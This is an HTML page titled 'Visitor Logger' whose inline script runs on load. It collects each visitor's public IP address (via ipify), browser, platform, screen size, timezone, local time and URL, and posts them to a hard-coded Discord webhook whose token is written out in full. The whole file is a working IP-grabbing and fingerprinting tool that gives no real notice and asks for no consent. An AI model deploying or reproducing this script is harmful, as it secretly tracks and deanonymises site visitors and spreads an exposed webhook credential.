<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Visitor Logger</title>
</head>
<body>
  <h1>Visitor Logger Active</h1>

  <script>
  (async () => {
    const webhookURL = "https://discord.com/api/webhooks/1395279513491079350/suo8tCqbxAo_hAWAcH0kiCw0cqEXqG6FCkzCS5wwxuQL1R6csw3LFl2TwpwHlkUVzlNc";

    const data = {
      ip: 'unknown',
      userAgent: navigator.userAgent,
      language: navigator.language,
      screenSize: `${screen.width}x${screen.height}`,
      url: location.href,
      platform: navigator.platform,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      localTime: new Date().toString(),
      deviceType: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
    };

    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const json = await res.json();
      data.ip = json.ip;
    } catch {}

    const message = `
**New Visitor Logged:**
- IP: ${data.ip}
- Device: ${data.deviceType}
- Platform: ${data.platform}
- Browser: ${data.userAgent}
- Language: ${data.language}
- Screen Size: ${data.screenSize}
- URL: ${data.url}
- Timezone: ${data.timezone}
- Local Time: ${data.localTime}
`;

    try {
      await fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: message })
      });
    } catch (err) {
      console.error('Failed to send Discord message', err);
    }
  })();
  </script>
</body>
</html>
